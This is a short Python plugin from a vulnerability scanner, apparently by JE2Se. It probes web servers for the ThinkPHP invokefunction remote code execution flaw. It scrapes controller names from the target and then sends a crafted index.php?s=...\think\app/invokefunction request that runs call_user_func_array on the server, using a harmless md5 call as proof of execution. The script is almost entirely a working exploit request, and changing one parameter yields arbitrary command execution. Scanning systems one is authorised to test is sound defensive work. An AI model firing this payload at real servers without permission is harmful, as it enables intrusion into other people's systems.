# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  ThinkPHP_Invoke_Func_Code_Exec.py
@Desc:
'''
import requests
from lib import *
import logging
import re
from lib.Urldeal import umethod

def ThinkPHP_Invoke_Func_Code_Exec(Url):
    scheme, url, port = umethod(Url)
    controllers = list()
    headers = {
        "User-Agent":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
    }
    try:
        resp = requests.get(Url, headers=headers, timeout=6, verify=False)
        pattern = '<a[\\s+]href="/[A-Za-z]+'
        matches = re.findall(pattern, resp.text)
        for match in matches:
            controllers.append(match.split('/')[1])
        controllers.append('index')
        controllers = list(set(controllers))
        for controller in controllers:
            payload = '/index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'.format(controller)
            payload_url = scheme + "://" + url + ":" + str(port) + payload
            resp1 = requests.get(payload_url, headers=headers, timeout=6, verify=False)
        if r"540676a129760a3" in resp1.text:
            print(Vcolors.RED +"[!] 存在ThinkPHP远程命令执行漏洞:->ThinkPHP_Invoke_Func_Code_Exec\r" + Vcolors.ENDC)
    except:
        logging.error("ThinkPHP_Invoke_Func_Code_Exec脚本出现异常")